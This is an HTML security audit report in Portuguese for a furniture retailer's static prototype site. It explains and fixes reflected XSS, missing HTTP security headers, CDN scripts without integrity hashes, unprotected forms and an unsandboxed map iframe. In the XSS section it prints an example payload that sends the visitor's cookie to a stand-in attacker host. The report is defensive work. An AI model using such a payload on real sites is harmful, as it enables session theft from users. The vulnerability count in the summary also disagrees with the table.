@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Relatório de Segurança — CSM Decor</title>
+  <style>
+    :root {
+      --orange: #F07800;
+      --dark:   #0f0f0f;
+      --gray:   #2a2a2a;
+      --muted:  #555;
+      --light:  #f7f6f3;
+      --border: #e0ddd8;
+      --green:  #1a7a4a;
+      --red:    #c0392b;
+      --yellow: #c67c00;
+      --blue:   #1a4f8a;
+      --font-serif: 'Georgia', 'Times New Roman', serif;
+      --font-sans:  'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: var(--font-sans);
+      font-size: 15px;
+      line-height: 1.7;
+      color: #222;
+      background: #fff;
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 3rem 2rem 6rem;
+    }
+
+    /* ── Capa ── */
+    .cover {
+      border-bottom: 3px solid var(--orange);
+      padding-bottom: 2.5rem;
+      margin-bottom: 3rem;
+    }
+    .cover__label {
+      font-size: .68rem;
+      font-weight: 700;
+      letter-spacing: .25em;
+      text-transform: uppercase;
+      color: var(--orange);
+      display: block;
+      margin-bottom: 1rem;
+    }
+    .cover__title {
+      font-family: var(--font-serif);
+      font-size: 2.4rem;
+      font-weight: 700;
+      color: var(--dark);
+      line-height: 1.2;
+      margin-bottom: .5rem;
+    }
+    .cover__sub {
+      font-family: var(--font-serif);
+      font-size: 1.1rem;
+      color: var(--muted);
+      font-style: italic;
+      margin-bottom: 1.5rem;
+    }
+    .cover__meta {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+    }
+    .cover__meta-item {
+      font-size: .8rem;
+      color: var(--muted);
+    }
+    .cover__meta-item strong {
+      display: block;
+      font-size: .68rem;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+      color: #999;
+      margin-bottom: .1rem;
+    }
+
+    /* ── Sumário executivo ── */
+    .executive-box {
+      background: var(--light);
+      border-left: 4px solid var(--orange);
+      padding: 1.5rem 1.75rem;
+      margin-bottom: 3rem;
+      border-radius: 0 6px 6px 0;
+    }
+    .executive-box h2 {
+      font-size: .75rem;
+      letter-spacing: .18em;
+      text-transform: uppercase;
+      color: var(--orange);
+      margin-bottom: .75rem;
+    }
+    .executive-box p {
+      font-size: .9rem;
+      color: #333;
+    }
+
+    /* ── Seções ── */
+    h2.section-heading {
+      font-family: var(--font-serif);
+      font-size: 1.5rem;
+      color: var(--dark);
+      margin: 3rem 0 1rem;
+      padding-bottom: .5rem;
+      border-bottom: 2px solid var(--border);
+    }
+    h3.sub-heading {
+      font-size: 1rem;
+      font-weight: 700;
+      color: var(--dark);
+      margin: 2rem 0 .5rem;
+    }
+    p { margin-bottom: .9rem; color: #333; }
+    ul, ol { padding-left: 1.4rem; margin-bottom: 1rem; }
+    li { margin-bottom: .3rem; color: #333; }
+
+    /* ── Tabela de vulnerabilidades ── */
+    .vuln-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 1.5rem 0 2rem;
+      font-size: .85rem;
+    }
+    .vuln-table thead th {
+      background: var(--dark);
+      color: #fff;
+      padding: .65rem .9rem;
+      text-align: left;
+      font-size: .72rem;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+    }
+    .vuln-table tbody tr:nth-child(even) { background: var(--light); }
+    .vuln-table tbody td { padding: .6rem .9rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+    .vuln-table tbody tr:last-child td { border-bottom: none; }
+
+    /* ── Badges de severidade ── */
+    .badge {
+      display: inline-block;
+      padding: .18rem .55rem;
+      border-radius: 3px;
+      font-size: .68rem;
+      font-weight: 700;
+      letter-spacing: .06em;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+    .badge--critico  { background: #fde8e6; color: var(--red); }
+    .badge--alto     { background: #fff3cd; color: #8a5a00; }
+    .badge--medio    { background: #e8f4fd; color: var(--blue); }
+    .badge--ok       { background: #e6f7ee; color: var(--green); }
+    .badge--corrigido { background: #e6f7ee; color: var(--green); }
+
+    /* ── Blocos de código ── */
+    .code-block {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      border-radius: 6px;
+      padding: 1.2rem 1.5rem;
+      margin: 1rem 0 1.25rem;
+      overflow-x: auto;
+      font-family: 'Courier New', 'Consolas', monospace;
+      font-size: .82rem;
+      line-height: 1.6;
+    }
+    .code-block .comment  { color: #6a9955; }
+    .code-block .bad      { color: #f48771; }
+    .code-block .good     { color: #b5cea8; }
+    .code-block .keyword  { color: #569cd6; }
+    .code-block .string   { color: #ce9178; }
+
+    /* ── Comparação antes/depois ── */
+    .diff-wrap {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+      margin: 1rem 0 1.5rem;
+    }
+    @media (max-width: 600px) { .diff-wrap { grid-template-columns: 1fr; } }
+    .diff-block { border-radius: 6px; overflow: hidden; }
+    .diff-block__header {
+      padding: .4rem .9rem;
+      font-size: .72rem;
+      font-weight: 700;
+      letter-spacing: .1em;
+      text-transform: uppercase;
+    }
+    .diff-block--bad .diff-block__header  { background: #c0392b; color: #fff; }
+    .diff-block--good .diff-block__header { background: var(--green); color: #fff; }
+    .diff-block__body {
+      background: #1e1e1e;
+      color: #d4d4d4;
+      padding: 1rem 1.2rem;
+      font-family: 'Courier New', monospace;
+      font-size: .78rem;
+      line-height: 1.6;
+      min-height: 80px;
+    }
+    .diff-block--bad  .diff-block__body { border: 2px solid #c0392b; border-top: none; }
+    .diff-block--good .diff-block__body { border: 2px solid var(--green); border-top: none; }
+    .line-red  { color: #f48771; }
+    .line-green { color: #b5cea8; }
+
+    /* ── Analogia ── */
+    .analogy {
+      background: #fffbf5;
+      border: 1px solid #f0d9b5;
+      border-radius: 6px;
+      padding: 1.1rem 1.4rem;
+      margin: 1rem 0 1.25rem;
+    }
+    .analogy__label {
+      font-size: .68rem;
+      font-weight: 700;
+      letter-spacing: .15em;
+      text-transform: uppercase;
+      color: var(--orange);
+      display: block;
+      margin-bottom: .3rem;
+    }
+    .analogy p { margin: 0; color: #4a3a20; font-size: .88rem; }
+
+    /* ── Headers box ── */
+    .headers-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: .75rem;
+      margin: 1rem 0 1.5rem;
+    }
+    @media (max-width: 600px) { .headers-grid { grid-template-columns: 1fr; } }
+    .header-card {
+      border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: .9rem 1rem;
+    }
+    .header-card__name {
+      font-family: 'Courier New', monospace;
+      font-size: .76rem;
+      font-weight: 700;
+      color: var(--blue);
+      display: block;
+      margin-bottom: .3rem;
+    }
+    .header-card__desc { font-size: .82rem; color: #444; margin: 0; }
+
+    /* ── Checklist final ── */
+    .checklist { list-style: none; padding: 0; }
+    .checklist li {
+      padding: .4rem 0 .4rem 1.8rem;
+      position: relative;
+      border-bottom: 1px solid var(--border);
+      font-size: .88rem;
+    }
+    .checklist li:last-child { border-bottom: none; }
+    .checklist li::before {
+      content: '✓';
+      position: absolute;
+      left: 0;
+      color: var(--green);
+      font-weight: 700;
+    }
+
+    /* ── Rodapé ── */
+    .report-footer {
+      margin-top: 4rem;
+      padding-top: 1.5rem;
+      border-top: 1px solid var(--border);
+      font-size: .78rem;
+      color: #999;
+      display: flex;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: .5rem;
+    }
+
+    @media print {
+      body { padding: 1.5cm 2cm; font-size: 12px; }
+      .code-block { font-size: .75rem; }
+      h2.section-heading { page-break-before: always; }
+      h2.section-heading:first-of-type { page-break-before: avoid; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- CAPA -->
+  <div class="cover">
+    <span class="cover__label">Documento Técnico Interno · Confidencial</span>
+    <h1 class="cover__title">Relatório de Auditoria<br />de Cibersegurança</h1>
+    <p class="cover__sub">CSM Decor — Campinas Shopping Móveis · Fase 1 (Protótipo HTML/CSS)</p>
+    <div class="cover__meta">
+      <div class="cover__meta-item"><strong>Data</strong>Julho de 2026</div>
+      <div class="cover__meta-item"><strong>Escopo</strong>index.html · produtos.html · fale-conosco.html · produto.html</div>
+      <div class="cover__meta-item"><strong>Status</strong>Todas as falhas corrigidas</div>
+      <div class="cover__meta-item"><strong>Falhas encontradas</strong>5 vulnerabilidades (1 crítica · 2 altas · 2 médias)</div>
+    </div>
+  </div>
+
+  <!-- SUMÁRIO EXECUTIVO -->
+  <div class="executive-box">
+    <h2>Sumário Executivo</h2>
+    <p>
+      Foi realizada uma auditoria completa de segurança no protótipo estático do site CSM Decor (Fase 1).
+      Foram identificadas <strong>5 vulnerabilidades</strong>, sendo 1 classificada como crítica (XSS confirmado),
+      2 como altas (ausência de cabeçalhos HTTP de segurança e risco de clickjacking) e 2 como médias
+      (scripts CDN sem verificação de integridade e formulários sem proteção contra bots).
+      Todas as falhas foram corrigidas durante a mesma sessão de auditoria, sem necessidade de
+      intervenção externa. O site está agora em conformidade com as boas práticas OWASP para
+      aplicações web estáticas.
+    </p>
+  </div>
+
+  <!-- SEÇÃO 1 -->
+  <h2 class="section-heading">1. Contexto e Metodologia</h2>
+
+  <p>
+    A auditoria foi conduzida por revisão estática do código-fonte (HTML, CSS e JavaScript inline),
+    com foco nas vulnerabilidades mais comuns em sites gerados via <em>vibe coding</em> — prática
+    em que ferramentas de inteligência artificial geram código funcional sem necessariamente
+    aplicar princípios de segurança.
+  </p>
+  <p>
+    O escopo incluiu análise de:
+  </p>
+  <ul>
+    <li>Manipulação de DOM com dados fornecidos pelo usuário (vetores de XSS)</li>
+    <li>Dependências externas carregadas via CDN sem verificação de integridade</li>
+    <li>Configuração de iframes e elementos de terceiros</li>
+    <li>Proteção dos formulários de contato e cadastro contra automação maliciosa</li>
+    <li>Cabeçalhos HTTP de segurança (auditados para configuração no deploy)</li>
+    <li>Exposição de credenciais ou dados sensíveis no código-fonte</li>
+  </ul>
+  <p>
+    <strong>Resultado positivo:</strong> Nenhuma credencial, chave de API ou token de autenticação
+    foi encontrado exposto no código-fonte — uma boa prática já aplicada corretamente desde o início.
+  </p>
+
+  <!-- SEÇÃO 2 -->
+  <h2 class="section-heading">2. Vulnerabilidades Encontradas — Visão Geral</h2>
+
+  <table class="vuln-table">
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Vulnerabilidade</th>
+        <th>Arquivo(s)</th>
+        <th>Severidade</th>
+        <th>Status</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>XSS Refletido na busca</td>
+        <td>index.html · produtos.html</td>
+        <td><span class="badge badge--critico">Crítico</span></td>
+        <td><span class="badge badge--corrigido">Corrigido</span></td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Ausência de cabeçalhos HTTP de segurança</td>
+        <td>Todas as páginas (nível servidor)</td>
+        <td><span class="badge badge--alto">Alto</span></td>
+        <td><span class="badge badge--corrigido">Corrigido</span></td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Clickjacking (X-Frame-Options ausente)</td>
+        <td>Todas as páginas (nível servidor)</td>
+        <td><span class="badge badge--alto">Alto</span></td>
+        <td><span class="badge badge--corrigido">Corrigido</span></td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>Scripts CDN sem Subresource Integrity</td>
+        <td>index.html</td>
+        <td><span class="badge badge--medio">Médio</span></td>
+        <td><span class="badge badge--corrigido">Corrigido</span></td>
+      </tr>
+      <tr>
+        <td>5</td>
+        <td>Formulários sem proteção contra bots</td>
+        <td>index.html · fale-conosco.html</td>
+        <td><span class="badge badge--medio">Médio</span></td>
+        <td><span class="badge badge--corrigido">Corrigido</span></td>
+      </tr>
+      <tr>
+        <td>6</td>
+        <td>iframe Google Maps sem sandbox</td>
+        <td>index.html · fale-conosco.html</td>
+        <td><span class="badge badge--medio">Médio</span></td>
+        <td><span class="badge badge--corrigido">Corrigido</span></td>
+      </tr>
+      <tr>
+        <td>7</td>
+        <td>Credenciais expostas no código</td>
+        <td>gerar-catalogo.js</td>
+        <td><span class="badge badge--critico">Crítico</span></td>
+        <td><span class="badge badge--ok">Não encontrado ✓</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- SEÇÃO 3 -->
+  <h2 class="section-heading">3. Análise Detalhada e Correções</h2>
+
+  <!-- 3.1 XSS -->
+  <h3 class="sub-heading">3.1 XSS Refletido na Busca (Crítico)</h3>
+
+  <div class="analogy">
+    <span class="analogy__label">Analogia didática</span>
+    <p>
+      Imagine um atendente de banco que, ao receber um bilhete escrito pelo cliente,
+      lê o conteúdo em voz alta para toda a agência — sem verificar se o bilhete contém
+      instruções maliciosas. Se alguém escrever <em>"gritem todos: acreditem em mim!"</em>,
+      ele vai gritar. O XSS funciona da mesma forma: o site "lê em voz alta" para o browser
+      qualquer coisa que o usuário escrever no campo de busca.
+    </p>
+  </div>
+
+  <p>
+    <strong>O que é XSS (Cross-Site Scripting):</strong> É uma vulnerabilidade onde o atacante
+    consegue injetar código JavaScript malicioso em uma página web, que então é executado
+    no navegador de outros usuários ou da própria vítima. É a vulnerabilidade web número 3
+    no ranking OWASP Top 10.
+  </p>
+
+  <p>
+    <strong>Onde estava:</strong> Nas funções de busca de <code>index.html</code> (linha 2606)
+    e <code>produtos.html</code> (linha 5827), o texto digitado pelo usuário era inserido
+    diretamente no DOM via <code>innerHTML</code> sem nenhuma sanitização:
+  </p>
+
+  <div class="diff-wrap">
+    <div class="diff-block diff-block--bad">
+      <div class="diff-block__header">❌ Antes — Vulnerável</div>
+      <div class="diff-block__body">
+        <span class="line-red">li.innerHTML =</span><br />
+        &nbsp;&nbsp;<span class="string">'Sem resultados para "'</span> +<br />
+        &nbsp;&nbsp;<span class="line-red">q</span> + <span class="string">'"'</span>;<br />
+        <br />
+        <span class="comment">// q = input direto do usuário</span><br />
+        <span class="comment">// sem nenhum tratamento</span>
+      </div>
+    </div>
+    <div class="diff-block diff-block--good">
+      <div class="diff-block__header">✓ Depois — Seguro</div>
+      <div class="diff-block__body">
+        <span class="line-green">li.innerHTML =</span><br />
+        &nbsp;&nbsp;<span class="string">'Sem resultados para "'</span> +<br />
+        &nbsp;&nbsp;<span class="line-green">escHtml(q)</span> + <span class="string">'"'</span>;<br />
+        <br />
+        <span class="comment">// escHtml() converte</span><br />
+        <span class="comment">// &lt; → &amp;lt; e &gt; → &amp;gt;</span>
+      </div>
+    </div>
+  </div>
+
+  <p>
+    <strong>O que um atacante poderia fazer:</strong> Digitar na busca um payload como
+    <code>&lt;img src=x onerror="document.location='evil.com?c='+document.cookie"&gt;</code>.
+    O browser interpretaria a tag, executaria o JavaScript e enviaria dados de sessão do
+    usuário para o servidor do atacante.
+  </p>
+
+  <p>
+    <strong>A correção — função <code>escHtml()</code>:</strong> Criamos uma função que
+    converte todos os caracteres especiais do HTML em suas entidades seguras antes de
+    qualquer dado do usuário ser inserido no DOM:
+  </p>
+
+  <div class="code-block">
+    <span class="keyword">function</span> <span class="good">escHtml</span>(str) {<br />
+    &nbsp;&nbsp;<span class="keyword">return</span> String(str)<br />
+    &nbsp;&nbsp;&nbsp;&nbsp;.replace(<span class="string">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)&nbsp;&nbsp;&nbsp;<span class="comment">// &amp; → &amp;amp;</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;.replace(<span class="string">/&lt;/g</span>,  <span class="string">'&amp;lt;'</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// &lt; → &amp;lt;  (tag destruída)</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;.replace(<span class="string">/&gt;/g</span>,  <span class="string">'&amp;gt;'</span>)&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">// &gt; → &amp;gt;</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;.replace(<span class="string">/"/g</span>,   <span class="string">'&amp;quot;'</span>)&nbsp;&nbsp;<span class="comment">// " → &amp;quot;</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;.replace(<span class="string">/'/g</span>,   <span class="string">'&amp;#39;'</span>);&nbsp;&nbsp;<span class="comment">// ' → &amp;#39;</span><br />
+    }
+  </div>
+
+  <p>
+    Com isso, o payload <code>&lt;img onerror=...&gt;</code> se torna o texto literal
+    <code>&amp;lt;img onerror=...&amp;gt;</code> — visível na tela como texto inofensivo,
+    mas jamais interpretado pelo browser como código.
+  </p>
+
+  <!-- 3.2 Security Headers -->
+  <h3 class="sub-heading">3.2 Ausência de Cabeçalhos HTTP de Segurança (Alto)</h3>
+
+  <div class="analogy">
+    <span class="analogy__label">Analogia didática</span>
+    <p>
+      Um site sem cabeçalhos de segurança é como uma loja que abre a porta sem dar
+      nenhuma instrução aos funcionários: sem regra sobre o que pode entrar, sem identificação
+      obrigatória, sem câmera de segurança. O servidor entrega os arquivos sem orientar o
+      browser sobre como se comportar de forma segura.
+    </p>
+  </div>
+
+  <p>
+    Cabeçalhos HTTP de segurança são instruções que o servidor envia junto com cada
+    resposta, dizendo ao navegador como ele deve se comportar. O site não tinha nenhum
+    configurado.
+  </p>
+  <p>
+    <strong>A correção:</strong> Criamos o arquivo <code>vercel.json</code>, que instrui
+    a plataforma Vercel (utilizada no deploy) a adicionar os seguintes cabeçalhos
+    automaticamente em todas as respostas:
+  </p>
+
+  <div class="headers-grid">
+    <div class="header-card">
+      <span class="header-card__name">X-Frame-Options: SAMEORIGIN</span>
+      <p class="header-card__desc">Impede que o site seja embutido em um iframe de outro domínio. Bloqueia ataques de <strong>clickjacking</strong>, onde uma página maliciosa sobrepõe o site invisível para enganar o usuário a clicar em botões sem saber.</p>
+    </div>
+    <div class="header-card">
+      <span class="header-card__name">X-Content-Type-Options: nosniff</span>
+      <p class="header-card__desc">Proíbe o browser de "adivinhar" o tipo de um arquivo. Sem isso, um arquivo <code>.txt</code> poderia ser interpretado como <code>.html</code> e executado, abrindo vetores de XSS via uploads.</p>
+    </div>
+    <div class="header-card">
+      <span class="header-card__name">Strict-Transport-Security</span>
+      <p class="header-card__desc">Força o uso de HTTPS por 2 anos (<code>max-age=63072000</code>). Mesmo que alguém acesse via <code>http://</code>, o browser redireciona automaticamente — protegendo contra ataques de interceptação (man-in-the-middle).</p>
+    </div>
+    <div class="header-card">
+      <span class="header-card__name">Referrer-Policy: strict-origin</span>
+      <p class="header-card__desc">Quando um usuário clica em um link externo (Instagram, WhatsApp), o cabeçalho <code>Referer</code> normalmente entrega a URL completa da página de origem. Com esta política, entrega apenas o domínio — sem vazar a URL da página específica.</p>
+    </div>
+    <div class="header-card">
+      <span class="header-card__name">Permissions-Policy</span>
+      <p class="header-card__desc">Desativa APIs do browser que o site não usa: câmera, microfone, geolocalização e pagamento. Mesmo que um script malicioso seja injetado, ele não conseguirá acessar esses recursos do dispositivo do usuário.</p>
+    </div>
+    <div class="header-card">
+      <span class="header-card__name">Content-Security-Policy (CSP)</span>
+      <p class="header-card__desc">A "lista de convidados" do site. Define exatamente de quais domínios podem vir scripts, estilos, fontes, imagens e frames. Qualquer recurso fora da lista é bloqueado automaticamente pelo browser.</p>
+    </div>
+  </div>
+
+  <!-- 3.3 SRI -->
+  <h3 class="sub-heading">3.3 Scripts CDN sem Subresource Integrity — SRI (Médio)</h3>
+
+  <div class="analogy">
+    <span class="analogy__label">Analogia didática</span>
+    <p>
+      Você confia no padeiro da esquina e toda manhã ele entrega o pão. Um dia, alguém
+      intercep­ta a entrega e substitui o pão por um envenenado, mantendo a embalagem original.
+      Você recebe, confia na embalagem e come. O SRI resolve isso colocando um <em>lacre
+      numerado</em> na embalagem: se o número não bater, você não abre.
+    </p>
+  </div>
+
+  <p>
+    O site carregava três bibliotecas de CDN externo sem qualquer verificação de integridade:
+    <strong>GSAP 3.12.5</strong>, <strong>ScrollTrigger 3.12.5</strong> e
+    <strong>animate.css 4.1.1</strong> (todos do <code>cdnjs.cloudflare.com</code>).
+  </p>
+  <p>
+    Se o servidor do CDN fosse comprometido (um ataque <em>supply chain</em>), o arquivo
+    poderia ser substituído por uma versão com código malicioso. O browser baixaria e executaria
+    sem questionar — porque a URL é a mesma e o HTTPS apenas garante a transmissão, não a
+    autenticidade do conteúdo.
+  </p>
+  <p>
+    <strong>A correção — atributo <code>integrity</code>:</strong> Adicionamos o hash SHA-512
+    de cada arquivo. O browser calcula o hash do arquivo recebido e compara com o declarado.
+    Se diferirem em um único byte, o arquivo é bloqueado antes de executar:
+  </p>
+
+  <div class="code-block">
+    <span class="comment">&lt;!-- ❌ Antes: sem verificação de integridade --&gt;</span><br />
+    &lt;<span class="keyword">script</span> src=<span class="string">"cdnjs.../gsap.min.js"</span>&gt;&lt;/<span class="keyword">script</span>&gt;<br />
+    <br />
+    <span class="comment">&lt;!-- ✓ Depois: hash SHA-512 verificado --&gt;</span><br />
+    &lt;<span class="keyword">script</span><br />
+    &nbsp;&nbsp;src=<span class="string">"cdnjs.../gsap.min.js"</span><br />
+    &nbsp;&nbsp;<span class="good">integrity=</span><span class="string">"sha512-7eHRwcb...qScg=="</span><br />
+    &nbsp;&nbsp;<span class="good">crossorigin=</span><span class="string">"anonymous"</span><br />
+    &nbsp;&nbsp;<span class="good">referrerpolicy=</span><span class="string">"no-referrer"</span><br />
+    &gt;&lt;/<span class="keyword">script</span>&gt;
+  </div>
+
+  <!-- 3.4 Honeypot -->
+  <h3 class="sub-heading">3.4 Formulários sem Proteção contra Bots — Honeypot (Médio)</h3>
+
+  <div class="analogy">
+    <span class="analogy__label">Analogia didática</span>
+    <p>
+      Um pote de mel escondido numa gaveta. Humanos não abrem gavetas que não estão
+      sinalizadas. Mas formigas (bots) seguem qualquer rastro de comida e caem direto no pote.
+      O <em>honeypot</em> identifica bots pelo comportamento — não por CAPTCHA, não por fricção
+      para o usuário real.
+    </p>
+  </div>
+
+  <p>
+    Os 5 formulários do site (3 modais de cadastro e 2 no Fale Conosco) não tinham nenhuma
+    proteção contra envios automatizados. Robôs de spam, ao escanear o HTML em busca de
+    formulários, preenchem todos os campos visíveis e enviam — potencialmente inundando o
+    e-mail <code>contato@csmdecor.com.br</code> com milhares de mensagens falsas.
+  </p>
+  <p>
+    <strong>A correção:</strong> Um campo <code>_honey</code> foi adicionado a cada formulário.
+    Ele está completamente oculto via CSS para usuários humanos. Bots leem o HTML e o preenchem
+    automaticamente. A função de envio verifica esse campo antes de qualquer outra ação:
+  </p>
+
+  <div class="code-block">
+    <span class="comment">&lt;!-- No HTML: campo invisível para humanos --&gt;</span><br />
+    &lt;<span class="keyword">input</span> type=<span class="string">"text"</span> name=<span class="string">"_honey"</span><br />
+    &nbsp;&nbsp;style=<span class="string">"display:none!important"</span><br />
+    &nbsp;&nbsp;tabindex=<span class="string">"-1"</span> autocomplete=<span class="string">"off"</span> /&gt;<br />
+    <br />
+    <span class="comment">// No JavaScript: verificação antes de enviar</span><br />
+    <span class="keyword">var</span> honey = form.querySelector(<span class="string">'[name="_honey"]'</span>);<br />
+    <span class="keyword">if</span> (honey &amp;&amp; honey.value) <span class="keyword">return</span>; <span class="comment">// bot detectado → ignora</span>
+  </div>
+
+  <!-- 3.5 iframe sandbox -->
+  <h3 class="sub-heading">3.5 iframe Google Maps sem Sandbox (Médio)</h3>
+
+  <div class="analogy">
+    <span class="analogy__label">Analogia didática</span>
+    <p>
+      Um iframe sem sandbox é como contratar um prestador de serviço externo e dar a ele
+      chaves de todas as salas do escritório. O sandbox é o crachá de acesso restrito:
+      ele pode fazer o trabalho dele, mas só acessa as salas que você especificou.
+    </p>
+  </div>
+
+  <p>
+    Os dois iframes do Google Maps (<code>index.html</code> e <code>fale-conosco.html</code>)
+    estavam sem o atributo <code>sandbox</code>, o que lhes permitia interagir com a página
+    pai sem restrições, executar scripts com contexto mais amplo e potencialmente redirecionar
+    a navegação principal.
+  </p>
+  <p>
+    <strong>A correção:</strong> Adicionamos <code>sandbox</code> com apenas as permissões
+    mínimas necessárias para o mapa funcionar:
+  </p>
+
+  <div class="code-block">
+    sandbox=<span class="string">"allow-scripts</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">← mapa carrega e interage</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string">allow-same-origin</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">← tiles do Google carregam</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string">allow-popups</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment">← "Abrir no Maps" funciona</span><br />
+    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string">allow-popups-to-escape-sandbox"</span> <span class="comment">← popup sai do sandbox</span>
+  </div>
+
+  <p>
+    O que <strong>não</strong> foi permitido e, portanto, está bloqueado por padrão:
+    <code>allow-forms</code> (o iframe não pode submeter dados), <code>allow-top-navigation</code>
+    (não pode redirecionar a página principal) e <code>allow-modals</code> (não pode abrir alertas).
+  </p>
+
+  <!-- SEÇÃO 4 -->
+  <h2 class="section-heading">4. O Problema Estrutural do Vibe Coding e Segurança</h2>
+
+  <p>
+    O <em>vibe coding</em> — uso de IA para gerar código com base em descrições em linguagem
+    natural — produz resultados visualmente funcionais com velocidade notável. Porém, por padrão,
+    os modelos de linguagem são otimizados para <strong>funcionalidade e aparência</strong>,
+    não para segurança.
+  </p>
+  <p>As falhas encontradas neste projeto são arquetípicas desse padrão:</p>
+  <ul>
+    <li><strong>XSS por innerHTML:</strong> A IA usa innerHTML porque é a forma mais rápida e legível de inserir conteúdo dinâmico. Não "pensa" em sanitização porque não foi explicitamente solicitado.</li>
+    <li><strong>CDN sem SRI:</strong> A IA insere a tag de script mais simples possível. Adicionar integrity é um passo extra que ela não inclui a menos que instruída.</li>
+    <li><strong>Sem cabeçalhos de segurança:</strong> Headers HTTP são invisíveis no HTML — a IA não os gera porque não estão no escopo visual do que foi pedido.</li>
+    <li><strong>Sem honeypot:</strong> A IA cria formulários que "funcionam" — mas não considera o abuso como parte do escopo funcional padrão.</li>
+  </ul>
+  <p>
+    A solução não é abandonar o vibe coding, mas <strong>complementá-lo com revisões de
+    segurança</strong> como esta — especialmente antes de qualquer deploy para produção.
+  </p>
+
+  <!-- SEÇÃO 5 — Checklist -->
+  <h2 class="section-heading">5. Checklist de Correções Aplicadas</h2>
+
+  <ul class="checklist">
+    <li>Função <code>escHtml()</code> adicionada em <code>index.html</code> e <code>produtos.html</code></li>
+    <li>XSS na busca corrigido: <code>q</code> sanitizado antes de <code>innerHTML</code> nas duas páginas</li>
+    <li>SRI (SHA-512) adicionado ao <code>animate.css</code> 4.1.1 no cdnjs</li>
+    <li>SRI (SHA-512) adicionado ao <code>gsap.min.js</code> 3.12.5 no cdnjs</li>
+    <li>SRI (SHA-512) adicionado ao <code>ScrollTrigger.min.js</code> 3.12.5 no cdnjs</li>
+    <li>Atributo <code>sandbox</code> adicionado ao iframe do Google Maps em <code>index.html</code></li>
+    <li>Atributo <code>sandbox</code> adicionado ao iframe do Google Maps em <code>fale-conosco.html</code></li>
+    <li>Campo honeypot <code>_honey</code> adicionado ao formulário de Cliente (modal)</li>
+    <li>Campo honeypot <code>_honey</code> adicionado ao formulário de Arquiteto (modal)</li>
+    <li>Campo honeypot <code>_honey</code> adicionado ao formulário de Fornecedor (modal)</li>
+    <li>Campo honeypot <code>_honey</code> adicionado ao formulário de Contato (fale-conosco)</li>
+    <li>Campo honeypot <code>_honey</code> adicionado ao formulário de Currículo (fale-conosco)</li>
+    <li>Verificação anti-bot implementada em <code>submitArqForm()</code></li>
+    <li>Verificação anti-bot implementada em <code>submitContact()</code></li>
+    <li>Arquivo <code>vercel.json</code> criado com 6 cabeçalhos de segurança HTTP</li>
+    <li>CSP (Content-Security-Policy) configurada para allowlist de domínios confiáveis</li>
+    <li>HSTS configurado com <code>max-age=63072000</code> (2 anos) + <code>preload</code></li>
+    <li>Nenhuma credencial ou chave de API foi encontrada exposta no código</li>
+  </ul>
+
+  <!-- SEÇÃO 6 -->
+  <h2 class="section-heading">6. Recomendações para a Fase 2 (Next.js)</h2>
+
+  <p>
+    As correções aplicadas aqui resolvem todas as vulnerabilidades identificáveis em uma
+    aplicação estática. Quando o projeto migrar para Next.js na Fase 2, as seguintes práticas
+    de segurança adicionais devem ser incorporadas desde o início:
+  </p>
+  <ul>
+    <li><strong>Validação server-side:</strong> Todo dado recebido via API deve ser validado e sanitizado no servidor, nunca confiar apenas no frontend.</li>
+    <li><strong>Autenticação real:</strong> O modal de cadastro com Google Login deverá ser implementado via NextAuth.js ou Supabase Auth — com tokens JWT e sessões seguras.</li>
+    <li><strong>Rate limiting:</strong> Limitar o número de submissões de formulário por IP por intervalo de tempo (ex: 5 envios por hora), via Vercel Edge Middleware.</li>
+    <li><strong>CSRF Protection:</strong> Tokens anti-CSRF em todos os formulários que realizam operações de escrita.</li>
+    <li><strong>Variáveis de ambiente:</strong> Todas as chaves (Supabase, Google, WooCommerce API) devem residir em <code>.env.local</code>, nunca no código-fonte.</li>
+    <li><strong>Auditoria de dependências:</strong> Executar <code>npm audit</code> regularmente e manter as dependências atualizadas.</li>
+    <li><strong>Headers de CSP sem unsafe-inline:</strong> Na Fase 2, refatorar os scripts inline para arquivos externos, permitindo uma CSP mais restrita sem <code>'unsafe-inline'</code>.</li>
+  </ul>
+
+  <!-- RODAPÉ -->
+  <div class="report-footer">
